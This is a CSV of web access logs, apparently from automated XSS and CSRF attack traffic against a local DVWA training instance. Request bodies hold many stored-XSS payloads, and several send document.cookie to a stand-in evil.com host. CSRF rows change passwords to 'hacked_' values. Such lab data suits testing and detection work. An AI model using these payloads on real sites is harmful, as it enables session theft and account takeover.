_id,body_bytes_sent,ip,request.method,request.path,request.protocol,request_body,status,timestamp
c63464bda5fd,254597,127.0.0.1,GET,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,txtName=<img+src=x+onerror=alert('XSS')>&mtxMessage=<img+src=x+onerror=alert('XSS')>&btnSign=Sign+Guestbook,200,2025-10-11T22:00:04
435d796042ca,6129,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,,200,2025-10-11T22:00:04
db3dba387ce7,6129,127.0.0.1,POST,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_SnLfiq&password_conf=hacked_pHpDET&Change=Change&user_token=c7f16244e1ccc532e21c263a2fc1e0cf,200,2025-10-11T22:00:04
435d796042ca,0,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_3spWUp&password_conf=hacked_RoG09d&Change=Change,302,2025-10-11T22:00:04
c68dfde5b0b6,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T22:00:04
7aa71467efcc,254597,127.0.0.1,GET,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,,200,2025-10-11T22:00:05
f493c6f4a20c,254830,127.0.0.1,POST,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,txtName=&lt;script&gt;alert('XSS')&lt;/script&gt;&mtxMessage=<script>alert('XSS')</script>&btnSign=Sign+Guestbook&user_token=e30fa69bd626555024b79a3cc22ac619,200,2025-10-11T22:00:05
40367b7901a5,6129,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,,200,2025-10-11T22:00:05
fef5e2990137,6129,127.0.0.1,POST,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_LuiIKJ&password_conf=hacked_5VRsa6&Change=Change&user_token=49fddfebfc0717a2a2137f16bc0a1f03,200,2025-10-11T22:00:05
40367b7901a5,6129,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,,200,2025-10-11T22:00:05
fef5e2990137,6129,127.0.0.1,POST,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_BayGH9&password_conf=hacked_XDnKRf&Change=Change&user_token=911b968c9c8ad946236ab8aec5b0cea4,200,2025-10-11T22:00:05
40367b7901a5,0,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,,302,2025-10-11T22:00:05
3941c82b07f5,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T22:00:05
fef5e2990137,0,127.0.0.1,POST,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_V3kIx6&password_conf=hacked_t0SzZe&Change=Change&user_token=2337318511ec987c10af561d42f00769,302,2025-10-11T22:00:05
3941c82b07f5,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T22:00:05
40367b7901a5,6129,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,,200,2025-10-11T22:00:05
36cafac2b191,6129,127.0.0.1,POST,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_viDsTN&password_conf=hacked_Nmod9r&Change=Change&user_token=d75109430d3fb669fd8f5f97b6923d43,200,2025-10-11T22:00:06
e237211236f9,6129,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,,200,2025-10-11T22:00:06
36cafac2b191,6129,127.0.0.1,POST,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_XeWjyM&password_conf=hacked_yvKGjv&Change=Change&user_token=27fd1b9e9693b5648df64d6b935c0f3c,200,2025-10-11T22:00:06
42fd92c0205d,254830,127.0.0.1,GET,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,,200,2025-10-11T22:00:06
37621d1b187e,255067,127.0.0.1,POST,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,txtName=&#60;script&#62;alert('XSS')&#60;/script&#62;&mtxMessage=<script>alert('XSS')</script>&btnSign=Sign+Guestbook&user_token=d85ac6eb6d9401c6f1978c059351c982,200,2025-10-11T22:00:06
f0993960d634,0,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,,302,2025-10-11T22:00:07
def11ca9a29b,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T22:00:07
2a01a566057f,0,127.0.0.1,POST,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_uqhxST&password_conf=hacked_U7ay3U&Change=Change&user_token=d522987739663da0e29abd7b82cb3030,302,2025-10-11T22:00:07
def11ca9a29b,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T22:00:07
f3343be20c3c,255067,127.0.0.1,GET,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,"txtName=data:text/html,<script>alert('XSS')</script>&mtxMessage=<svg+onload=alert('XSS')>&btnSign=Sign+Guestbook",200,2025-10-11T22:00:07
f3343be20c3c,255067,127.0.0.1,GET,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,txtName=<svg+onload=alert('XSS')>&mtxMessage=<body+onload=alert('XSS')>&btnSign=Sign+Guestbook,200,2025-10-11T22:00:07
f3343be20c3c,255067,127.0.0.1,GET,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,,200,2025-10-11T22:00:07
4211fe15d2dd,255362,127.0.0.1,POST,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,"txtName=<ScRiPt>alert('XSS')</ScRiPt>&mtxMessage=<img+src=""""+onerror=""this.src='http://evil.com/log.php?cookie='+document.cookie"">&btnSign=Sign+Guestbook&user_token=0d2be1fe03558a3afe8707ece603a8be",200,2025-10-11T22:00:08
7e7bcdfebf1a,0,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_mkhrTT&password_conf=hacked_uhRiQy&Change=Change,302,2025-10-11T22:00:08
99b20adf9a63,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T22:00:08
7e7bcdfebf1a,6129,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,,200,2025-10-11T22:00:08
69199a2fa3b1,6129,127.0.0.1,POST,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_EJ4Ow8&password_conf=hacked_Bi8zk6&Change=Change&user_token=a0ca515e945d3d97673b05d3f7d7a912,200,2025-10-11T22:00:08
7e7bcdfebf1a,6129,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,,200,2025-10-11T22:00:08
69199a2fa3b1,6129,127.0.0.1,POST,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_G19yMR&password_conf=hacked_NM7QsZ&Change=Change&user_token=4d922fcbe127bc44269a957b698ee818,200,2025-10-11T22:00:08
6a04876ca7c6,255362,127.0.0.1,GET,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,txtName=<form><button+formaction=javascript:alert('XSS')>Click</button></form>&mtxMessage=<script>document.location='http://evil.com/steal.php?cookie='+document.cookie</script>&btnSign=Sign+Guestbook,200,2025-10-11T22:00:08
a376242c683f,0,127.0.0.1,GET,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,"txtName=<ScRiPt>alert('XSS')</ScRiPt>&mtxMessage=<a+href=""javascript:alert('XSS_PByn')"">Click+me</a>&btnSign=Sign+Guestbook",302,2025-10-11T22:00:09
c78b464767c0,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T22:00:09
eb6d4a5d3a0a,154,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_5zH2DX&password_conf=hacked_j1HFed&Change=Change,302,2025-10-11T22:00:09
27438fa6bb52,6210,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/index.php,HTTP/1.1,,200,2025-10-11T22:00:09
eb6d4a5d3a0a,6129,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,,200,2025-10-11T22:00:09
2ef55d150459,6129,127.0.0.1,POST,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_iCh8NC&password_conf=hacked_3VVUuV&Change=Change&user_token=84f564fcdaac1657e150a981f6dc7aa1,200,2025-10-11T22:00:09
eb6d4a5d3a0a,154,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_6cOmHK&password_conf=hacked_RyGn4U&Change=Change,302,2025-10-11T22:00:09
27438fa6bb52,6210,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/index.php,HTTP/1.1,,200,2025-10-11T22:00:09
a1dc8e1a0d81,0,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_g5ZihJ&password_conf=hacked_ekOqk0&Change=Change,302,2025-10-11T22:00:10
98178efb1cca,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T22:00:10
a1dc8e1a0d81,6129,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,,200,2025-10-11T22:00:10
044db7834aae,6129,127.0.0.1,POST,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_3SkLrU&password_conf=hacked_ABXiii&Change=Change&user_token=fa15ea10d10f5b7381d8ad54e52a124a,200,2025-10-11T22:00:10
f91757ac6435,255362,127.0.0.1,GET,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,"txtName=<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>&mtxMessage=javascript:alert('XSS')&btnSign=Sign+Guestbook",200,2025-10-11T22:00:10
f91757ac6435,255362,127.0.0.1,GET,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,,200,2025-10-11T22:00:10
3f53ffccd7b8,255613,127.0.0.1,POST,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,"txtName=<script>alert('XSS')</script>&mtxMessage=<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>&btnSign=Sign+Guestbook&user_token=8c25b5f13d34426baef6de33875c7b14",200,2025-10-11T22:00:11
11ba481bfe1a,0,127.0.0.1,GET,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,"txtName=<a+href=""javascript:alert('XSS_PByn')"">Click+me</a>&mtxMessage=data:text/html,<script>alert('XSS')</script>&btnSign=Sign+Guestbook",302,2025-10-11T22:00:11
de2c2b43b927,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T22:00:11
11ba481bfe1a,255613,127.0.0.1,GET,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,,200,2025-10-11T22:00:11
638c7f4cc901,255900,127.0.0.1,POST,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,"txtName=<iframe+src='javascript:alert(document.cookie)'></iframe>&mtxMessage=<div+onmouseover=""alert('XSS_GJQj')"">Hover+me</div>&btnSign=Sign+Guestbook&user_token=578028e041b148f713a2327d5552ff73",200,2025-10-11T22:00:12
aac3bee86f20,154,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_NbU7ZJ&password_conf=hacked_7s6Zde&Change=Change,302,2025-10-11T22:00:12
49810ca7a977,6210,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/index.php,HTTP/1.1,,200,2025-10-11T22:00:12
aac3bee86f20,6129,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,,200,2025-10-11T22:00:12
4d9912cc0689,6129,127.0.0.1,POST,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_gMZGNb&password_conf=hacked_iUUErp&Change=Change&user_token=4040570ddc4ce64d92296314bae2952d,200,2025-10-11T22:00:12
aac3bee86f20,0,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_htoWSe&password_conf=hacked_XFozds&Change=Change,302,2025-10-11T22:00:12
479b5204ff46,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T22:00:12
d5d3f3c9945b,154,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_Cs0aWq&password_conf=hacked_HlOoiP&Change=Change,302,2025-10-11T22:00:13
02d192f19668,6210,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/index.php,HTTP/1.1,,200,2025-10-11T22:00:13
d5d3f3c9945b,6129,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,,200,2025-10-11T22:00:13
c57e26c5bf47,6129,127.0.0.1,POST,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_b8nWNs&password_conf=hacked_4bS4wB&Change=Change&user_token=337df44872c590257aa8b78e9b30cff2,200,2025-10-11T22:00:13
08f401f13c3d,255900,127.0.0.1,GET,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,txtName=javascript:alert('XSS')&mtxMessage=javascript:alert('XSS')&btnSign=Sign+Guestbook,200,2025-10-11T22:00:13
d5d3f3c9945b,0,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,,302,2025-10-11T22:00:13
b834c2217796,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T22:00:13
c57e26c5bf47,0,127.0.0.1,POST,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_aebSGT&password_conf=hacked_uTThX2&Change=Change&user_token=dc72b83c3587ac2abe74077429481245,302,2025-10-11T22:00:13
b834c2217796,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T22:00:13
08f401f13c3d,255900,127.0.0.1,GET,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,,200,2025-10-11T22:00:13
220c01f97b71,256175,127.0.0.1,POST,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,"txtName=<a+href=""javascript:alert('XSS_PByn')"">Click+me</a>&mtxMessage=&lt;script&gt;alert('XSS')&lt;/script&gt;&btnSign=Sign+Guestbook&user_token=2b4892a8724dbfb0b5ffc776ceba195a",200,2025-10-11T22:00:14
4403d963fe65,154,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_vw5VmS&password_conf=hacked_YuyRJb&Change=Change,302,2025-10-11T22:00:14
536bbc0078b4,6210,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/index.php,HTTP/1.1,,200,2025-10-11T22:00:14
4403d963fe65,154,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_xAvlhq&password_conf=hacked_SIOH1B&Change=Change,302,2025-10-11T22:00:14
536bbc0078b4,6210,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/index.php,HTTP/1.1,,200,2025-10-11T22:00:14
4403d963fe65,0,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_jCQ9wx&password_conf=hacked_wLpYMr&Change=Change,302,2025-10-11T22:00:14
fb79e02b7a87,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T22:00:14
4b1376ccb3ce,256175,127.0.0.1,GET,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,txtName=<body+onload=alert('XSS')>&mtxMessage=<script>document.location='http://evil.com/steal.php?cookie='+document.cookie</script>&btnSign=Sign+Guestbook,200,2025-10-11T22:00:14
4403d963fe65,6129,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,,200,2025-10-11T22:00:14
375c6f2d1284,6129,127.0.0.1,POST,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_PqBVnX&password_conf=hacked_kgGaGg&Change=Change&user_token=0abc02737712aeb7f3aa8bfb134af25e,200,2025-10-11T22:00:15
ad7f367d24f7,154,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_09WLtc&password_conf=hacked_4d1mnw&Change=Change,302,2025-10-11T22:00:15
39d2d4a7dbb6,6210,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/index.php,HTTP/1.1,,200,2025-10-11T22:00:15
ad7f367d24f7,0,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_pwQgwf&password_conf=hacked_R9r19p&Change=Change,302,2025-10-11T22:00:15
248fa0f904b3,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T22:00:15
ad7f367d24f7,154,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_VpaBNH&password_conf=hacked_TO0WX9&Change=Change,302,2025-10-11T22:00:15
39d2d4a7dbb6,6210,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/index.php,HTTP/1.1,,200,2025-10-11T22:00:15
1b768740d62a,256175,127.0.0.1,GET,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,txtName=<body+onload=alert('XSS')>&mtxMessage=<img+src=x+onerror=alert('XSS')>&btnSign=Sign+Guestbook,200,2025-10-11T22:00:15
ad7f367d24f7,154,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_VcIQPM&password_conf=hacked_a03oUG&Change=Change,302,2025-10-11T22:00:15
2396bd48f989,6210,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/index.php,HTTP/1.1,,200,2025-10-11T22:00:16
c0fe3ee261f7,0,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_bWAhaG&password_conf=hacked_t2RWb2&Change=Change,302,2025-10-11T22:00:16
3a465ad9adef,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T22:00:16
c0fe3ee261f7,154,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_YrBK3k&password_conf=hacked_W0Dlqp&Change=Change,302,2025-10-11T22:00:16
2396bd48f989,6210,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/index.php,HTTP/1.1,,200,2025-10-11T22:00:16
c0fe3ee261f7,154,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_i5Xqv6&password_conf=hacked_2ZqD0f&Change=Change,302,2025-10-11T22:00:16
2396bd48f989,6210,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/index.php,HTTP/1.1,,200,2025-10-11T22:00:16
95b6821fb276,256175,127.0.0.1,GET,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,,200,2025-10-11T22:00:16
99585ee15cd7,256427,127.0.0.1,POST,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,"txtName=data:text/html,<script>alert('XSS')</script>&mtxMessage=&#60;script&#62;alert('XSS')&#60;/script&#62;&btnSign=Sign+Guestbook&user_token=dbb889fe5d008432b4ae7bc0ad23e159",200,2025-10-11T22:00:17
297f3cbeb20c,0,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_Gi2CEX&password_conf=hacked_OjTOLh&Change=Change,302,2025-10-11T22:00:17
775fac44d46e,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T22:00:17
297f3cbeb20c,154,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_6TN3lo&password_conf=hacked_heocxv&Change=Change,302,2025-10-11T22:00:17
9654717982e4,6210,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/index.php,HTTP/1.1,,200,2025-10-11T22:00:17
8a36632715dc,256427,127.0.0.1,GET,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,"txtName=<img+src=x+onerror=alert('XSS')>&mtxMessage=<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>&btnSign=Sign+Guestbook",200,2025-10-11T22:00:17
297f3cbeb20c,6129,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,,200,2025-10-11T22:00:17
00672358078c,6129,127.0.0.1,POST,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_DmsKmi&password_conf=hacked_HXLCqD&Change=Change&user_token=7d1f7376f868263cb4f2722eb117593b,200,2025-10-11T22:00:17
bba49108ccca,0,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_dwLD3r&password_conf=hacked_R1Nhq6&Change=Change,302,2025-10-11T22:00:18
d8548735ee0a,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T22:00:18
bba49108ccca,154,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_I5uVoD&password_conf=hacked_ugwNLU&Change=Change,302,2025-10-11T22:00:18
892b5142f3b9,6210,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/index.php,HTTP/1.1,,200,2025-10-11T22:00:18
d67b1aacae5b,256427,127.0.0.1,GET,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,txtName=<img+src=x+onerror=alert('XSS')>&mtxMessage=javascript:alert('XSS')&btnSign=Sign+Guestbook,200,2025-10-11T22:00:18
d67b1aacae5b,256427,127.0.0.1,GET,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,,200,2025-10-11T22:00:18
4e2d31535ad2,256742,127.0.0.1,POST,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,"txtName=&#60;script&#62;alert('XSS')&#60;/script&#62;&mtxMessage=<img+src=""""+onerror=""this.src='http://evil.com/log.php?cookie='+document.cookie"">&btnSign=Sign+Guestbook&user_token=891f865b4798bc1fa652e1403288a6bd",200,2025-10-11T22:00:19
2d4f4eff0e26,0,127.0.0.1,GET,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,,302,2025-10-11T22:00:19
b09b940faa40,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T22:00:19
4e2d31535ad2,0,127.0.0.1,POST,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,"txtName=<div+onmouseover=""alert('XSS_GJQj')"">Hover+me</div>&mtxMessage=<iframe+src='javascript:alert(document.cookie)'></iframe>&btnSign=Sign+Guestbook&user_token=72a74fb2832dafd913fc2a07ac991237",302,2025-10-11T22:00:19
b09b940faa40,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T22:00:19
d6f383471086,6129,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,,200,2025-10-11T22:00:19
a9f49482bccf,6129,127.0.0.1,POST,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_emsOLd&password_conf=hacked_jC1OyF&Change=Change&user_token=473b04e1d8ffc7a828e73b402b697f3a,200,2025-10-11T22:00:19
2d4f4eff0e26,256742,127.0.0.1,GET,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,,200,2025-10-11T22:00:19
eb6d7f05ce50,256959,127.0.0.1,POST,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,txtName=<ScRiPt>alert('XSS')</ScRiPt>&mtxMessage=<script>alert('XSS')</script>&btnSign=Sign+Guestbook&user_token=9662473f061789f5891d52fa3a94fddb,200,2025-10-11T22:00:20
3c700ebdf4ee,6129,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,,200,2025-10-11T22:00:20
db3ead3c2e6d,6129,127.0.0.1,POST,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_q90Scc&password_conf=hacked_WnHCl5&Change=Change&user_token=d37eaed109b420a0fccaf66f63c5cb73,200,2025-10-11T22:00:20
b8d2d7a48966,0,127.0.0.1,GET,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,,302,2025-10-11T22:00:20
c8ba30f2e499,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T22:00:20
eb6d7f05ce50,0,127.0.0.1,POST,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,"txtName=javascript:alert('XSS')&mtxMessage=data:text/html,<script>alert('XSS')</script>&btnSign=Sign+Guestbook&user_token=8ad0cfeca4b7c0489508437bd82aa670",302,2025-10-11T22:00:20
c8ba30f2e499,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T22:00:20
3c700ebdf4ee,154,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_WYhcwP&password_conf=hacked_fLkLMN&Change=Change,302,2025-10-11T22:00:20
811aed8e19a9,6210,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/index.php,HTTP/1.1,,200,2025-10-11T22:00:20
82a7423efd4d,6129,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,,200,2025-10-11T22:00:21
47b62e17356d,6129,127.0.0.1,POST,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_SQhITH&password_conf=hacked_zy7o4D&Change=Change&user_token=c10f526524a1a6008aa7be8317456a83,200,2025-10-11T22:00:21
3764e4a0cc7b,256959,127.0.0.1,GET,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,txtName=<iframe+src='javascript:alert(document.cookie)'></iframe>&mtxMessage=&#60;script&#62;alert('XSS')&#60;/script&#62;&btnSign=Sign+Guestbook,200,2025-10-11T22:00:21
82a7423efd4d,0,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,,302,2025-10-11T22:00:21
c187f91fbf6d,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T22:00:21
47b62e17356d,0,127.0.0.1,POST,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_t5CcYL&password_conf=hacked_ht3zM9&Change=Change&user_token=12b7319f9fa78e360c2e5abc2e34ecf3,302,2025-10-11T22:00:21
c187f91fbf6d,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T22:00:21
82a7423efd4d,6129,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,,200,2025-10-11T22:00:21
47b62e17356d,6129,127.0.0.1,POST,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_BulFzW&password_conf=hacked_aexpnk&Change=Change&user_token=8d447b3d0dcd1ed9a6e309ddabdfeb88,200,2025-10-11T22:00:21
82a7423efd4d,6129,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,,200,2025-10-11T22:00:21
47b62e17356d,6129,127.0.0.1,POST,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_Chl7pQ&password_conf=hacked_vSoxaZ&Change=Change&user_token=742a928faf9dbbaffc0885450936b925,200,2025-10-11T22:00:21
68fa1355c070,256959,127.0.0.1,GET,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,,200,2025-10-11T22:00:22
b715f9155d50,257228,127.0.0.1,POST,/DVWA/vulnerabilities/xss_s/,HTTP/1.1,txtName=<body+onload=alert('XSS')>&mtxMessage=<form><button+formaction=javascript:alert('XSS')>Click</button></form>&btnSign=Sign+Guestbook&user_token=c39fa4b3484b49cacd758256a733d6f5,200,2025-10-11T22:00:22
964d97b82475,0,127.0.0.1,GET,/DVWA/vulnerabilities/csrf/,HTTP/1.1,,302,2025-10-11T22:00:22
428a244cc4de,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T22:00:22
32cbe4b14ec6,0,127.0.0.1,POST,/DVWA/vulnerabilities/csrf/,HTTP/1.1,password_new=hacked_WtaORN&password_conf=hacked_qVwdjm&Change=Change&user_token=7537fc282486684d55ebc8030297ce29,302,2025-10-11T22:00:22
428a244cc4de,1342,127.0.0.1,GET,/DVWA/login.php,HTTP/1.1,,200,2025-10-11T22:00:22
